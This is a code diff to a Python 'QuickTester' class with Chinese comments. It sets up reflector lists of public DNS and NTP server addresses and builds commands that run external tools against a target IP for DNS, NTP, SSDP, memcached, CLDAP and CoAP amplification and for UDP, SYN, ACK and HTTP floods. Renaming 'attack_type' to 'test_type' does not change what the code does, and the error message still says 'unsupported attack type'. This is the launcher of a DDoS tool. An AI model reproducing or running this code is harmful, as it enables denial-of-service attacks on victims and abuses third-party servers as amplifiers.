@@ -53,28 +53,72 @@ class QuickTester:
     
     def create_default_reflectors(self):
         """创建默认反射器列表"""
-        # DNS服务器列表
-        dns_servers = """8.8.8.8 google.com
-1.1.1.1 cloudflare.com
-208.67.222.222 opendns.com
-9.9.9.9 quad9.net
-77.88.8.8 yandex.com
-156.154.70.1 neustar.biz
-8.26.56.26 comodo.com
-64.6.64.6 verisign.com"""
+        # 检查是否存在新的反射器文件
+        dns_file_paths = [
+            "reflector_lists/dns_servers.txt",  # 优先使用验证过的DNS列表
+            "reflector_lists/large_dns_servers.txt",  # 备用大型DNS列表
+        ]
+
+        dns_file_found = False
+        for dns_path in dns_file_paths:
+            if os.path.exists(dns_path):
+                # 复制到工作目录
+                import shutil
+                try:
+                    shutil.copy(dns_path, "dns_list.txt")
+                    dns_file_found = True
+                    self.log(f"✅ 使用反射器文件: {dns_path}")
+                    break
+                except Exception as e:
+                    self.log(f"⚠️ 复制反射器文件失败: {e}")
+
+        if not dns_file_found:
+            # 创建默认DNS服务器列表
+            dns_servers = """8.8.8.8
+8.8.4.4
+1.1.1.1
+1.0.0.1
+208.67.222.222
+208.67.220.220
+114.114.114.114
+223.5.5.5
+77.88.8.8
+64.6.64.6"""
+
+            with open("dns_list.txt", "w") as f:
+                f.write(dns_servers)
+            self.log("⚠️ 使用默认DNS反射器列表")
         
-        with open("dns_list.txt", "w") as f:
-            f.write(dns_servers)
-        
-        # NTP服务器列表 (示例，实际需要扫描)
-        ntp_servers = """129.6.15.28
+        # NTP服务器列表 - 使用更新后的ntpamp.txt
+        ntp_file_paths = [
+            "scan_filter_attack/ntp_scan_filter/ntp/ntpamp.txt",  # 新的NTP反射器列表
+        ]
+
+        ntp_file_found = False
+        for ntp_path in ntp_file_paths:
+            if os.path.exists(ntp_path):
+                try:
+                    import shutil
+                    shutil.copy(ntp_path, "ntp_list.txt")
+                    ntp_file_found = True
+                    self.log(f"✅ 使用NTP反射器文件: {ntp_path}")
+                    break
+                except Exception as e:
+                    self.log(f"⚠️ 复制NTP反射器文件失败: {e}")
+
+        if not ntp_file_found:
+            # 创建默认NTP服务器列表
+            ntp_servers = """129.6.15.28
 129.6.15.29
 132.163.96.1
 132.163.96.2
-216.229.0.179"""
-        
-        with open("ntp_list.txt", "w") as f:
-            f.write(ntp_servers)
+216.229.0.179
+216.239.35.0
+162.159.200.1"""
+
+            with open("ntp_list.txt", "w") as f:
+                f.write(ntp_servers)
+            self.log("⚠️ 使用默认NTP反射器列表")
         
         # SSDP设备列表 (示例，实际需要扫描)
         ssdp_devices = """192.168.1.1
@@ -117,23 +161,23 @@ class QuickTester:
             return False
 
         # 构造命令
-        if attack_type.lower() == "http2":
+        if test_type.lower() == "http2":
             cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
-        elif attack_type.lower() == "cldap":
+        elif test_type.lower() == "cldap":
             cmd = f"{tool_path} {target_ip} {target_port} cldap_list.txt {threads} {duration}"
-        elif attack_type.lower() == "coap":
+        elif test_type.lower() == "coap":
             cmd = f"{tool_path} {target_ip} {target_port} coap_list.txt {threads} {duration}"
-        elif attack_type.lower() == "dns":
+        elif test_type.lower() == "dns":
             cmd = f"{tool_path} {target_ip} {target_port} dns_list.txt {threads} {duration}"
-        elif attack_type.lower() == "ntp":
+        elif test_type.lower() == "ntp":
             cmd = f"{tool_path} {target_ip} {target_port} ntp_list.txt {threads} -1 {duration}"
-        elif attack_type.lower() == "ssdp":
+        elif test_type.lower() == "ssdp":
             cmd = f"{tool_path} {target_ip} {target_port} ssdp_list.txt {threads} -1 {duration}"
-        elif attack_type.lower() == "memcached":
+        elif test_type.lower() == "memcached":
             cmd = f"{tool_path} {target_ip} {target_port} memcached_list.txt {threads} {duration}"
-        elif attack_type.lower() in ["udp", "syn", "ack"]:
+        elif test_type.lower() in ["udp", "syn", "ack"]:
             cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
-        elif attack_type.lower() == "http":
+        elif test_type.lower() == "http":
             cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
         else:
             self.log(f"不支持的攻击类型: {attack_type}")
